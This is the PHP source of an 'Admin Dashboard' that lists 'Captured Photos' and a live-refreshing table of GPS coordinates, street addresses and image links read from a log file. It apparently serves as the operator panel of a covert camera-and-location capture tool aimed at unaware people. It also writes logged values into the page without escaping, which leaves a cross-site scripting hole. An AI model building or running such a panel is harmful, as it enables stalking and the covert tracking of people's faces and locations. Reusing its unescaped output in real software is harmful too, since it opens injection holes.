<?php
// Read log.txt
$logFile = "log.txt";
$logs = [];
if (file_exists($logFile)) {
    $logs = array_reverse(file($logFile)); // latest first
}

// Read uploaded images
$images = array_reverse(glob("uploads/*.jpg"));

// Build address mapping from logs
$addressMap = [];
foreach ($logs as $line) {
    if (strpos($line, "PHOTO") !== false) {
        $parts = explode("|", $line);
        if (count($parts) >= 6) {
            $address = trim(str_replace("ADDRESS:", "", $parts[5]));
            $file = trim(str_replace("FILE:", "", $parts[6] ?? ""));
            if ($file !== "") {
                $addressMap[$file] = $address;
            }
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Admin Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
    margin: 0;
    background: #121212;
    color: #e5e5e5;
    font-family: Arial, sans-serif;
    padding: 20px;
}

h1 {
    text-align: center;
    font-weight: bold;
    margin-bottom: 25px;
    color: #ffffff;
    letter-spacing: 1px;
}

.section {
    background: #1e1e1e;
    padding: 18px;
    border-radius: 14px;
    margin-bottom: 35px;
    box-shadow: 0 0 20px rgba(0,0,0,0.45);
}

.photo-grid {
    display: flex;
    flex-wrap: wrap;
    gap: 14px;
    justify-content: center;
}

.img-box {
    position: relative;
}

.img-box img {
    width: 150px;
    height: 150px;
    object-fit: cover;
    border-radius: 12px;
    border: 2px solid #333;
    cursor: pointer;
    transition: 0.25s;
}

.img-box img:hover {
    transform: scale(1.05);
    border-color: #4da3ff;
}

.address-popup {
    margin-top: 6px;
    background: #2b2b2b;
    padding: 6px 10px;
    border-radius: 8px;
    font-size: 12px;
    color: #ccc;
    border-left: 3px solid #4da3ff;
    cursor: pointer;
    max-width: 150px;
    overflow: hidden;
    white-space: nowrap;
}

.address-popup .addr-full {
    white-space: normal;
       color: #4da3ff;
    text-decoration: none;
}


table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 12px;
}

th, td {
    padding: 10px;
    border-bottom: 1px solid #333;
    font-size: 14px;
}

th {
    background: #272727;
    color: #4da3ff;
    text-transform: uppercase;
    font-weight: bold;
}

a.view-link {
    color: #4da3ff;
    text-decoration: none;
    font-weight: bold;
}

.refresh-note {
    font-size: 13px;
    color: #999;
    margin-bottom: 10px;
    text-align: right;
}

.refresh-btn {
    background: #4da3ff;
    border: none;
    padding: 8px 14px;
    border-radius: 6px;
    cursor: pointer;
    color: #111;
    margin-bottom: 12px;
    font-weight: bold;
}
</style>

<script>
// Auto-refresh every 6 seconds
setInterval(() => {
    window.location.reload();
}, 6000);
</script>

</head>
<body>

<h1>ADMIN DASHBOARD</h1>

<div class="section">
    <h2 style="color:#4da3ff; margin-bottom:10px;">Captured Photos</h2>
    <div class="refresh-note">(Updates every 6 seconds)</div>

    <div class="photo-grid">
    <?php if (count($images) == 0): ?>
        <p>No photos yet.</p>
    <?php else: ?>
        <?php foreach ($images as $img): ?>
            <div class="img-box">
                <a href="<?= $img ?>" target="_blank">
                    <img src="<?= $img ?>">
                </a>

                <?php if (isset($addressMap[$img])): 
                    $addr = $addressMap[$img];
                    $mapLink = "https://www.google.com/maps/search/?api=1&query=" . urlencode($addr);
                ?>
                <?php
// Shorten long address for preview
$short = (strlen($addr) > 45) ? substr($addr, 0, 45) . "..." : $addr;
?>

<div class="address-popup" onclick="toggleAddress(this)">
    <span class="addr-short"><?= $short ?></span>
    <span class="addr-full" style="display:none;">
        <a href="<?= $mapLink ?>" target="_blank"><?= $addr ?></a>
    </span>
</div>

                <?php endif; ?>

            </div>
        <?php endforeach; ?>
    <?php endif; ?>
    </div>
</div>

<div class="section">
    <h2 style="color:#4da3ff;">GPS & Photo Logs</h2>
    <table>
        <tr>
            <th>Time</th>
            <th>Type</th>
            <th>Lat</th>
            <th>Lon</th>
            <th>Address</th>
            <th>Image</th>
        </tr>

        <?php foreach ($logs as $line): 
            $parts = explode("|", $line);
            if (count($parts) < 5) continue;

            $time = trim($parts[0]);
            $type = trim($parts[1]);
            $lat = trim(str_replace("LAT:", "", $parts[3]));
            $lon = trim(str_replace("LON:", "", $parts[4]));
            $addr = isset($parts[5]) ? trim(str_replace("ADDRESS:", "", $parts[5])) : "";
            $file = isset($parts[6]) ? trim(str_replace("FILE:", "", $parts[6])) : "";
        ?>
        <tr>
            <td><?= $time ?></td>
            <td><?= $type ?></td>
            <td><?= $lat ?></td>
            <td><?= $lon ?></td>
            <td><?= $addr ?></td>
            <td>
                <?php if ($file && file_exists($file)): ?>
                    <a class="view-link" href="<?= $file ?>" target="_blank">View</a>
                <?php else: ?>
                    -
                <?php endif; ?>
            </td>
        </tr>
        <?php endforeach; ?>

    </table>
</div>

<script>
function toggleAddress(el) {
    const short = el.querySelector('.addr-short');
    const full = el.querySelector('.addr-full');

    if (full.style.display === "none") {
        short.style.display = "none";
        full.style.display = "block";
    } else {
        full.style.display = "none";
        short.style.display = "block";
    }
}
</script>


</body>
</html>
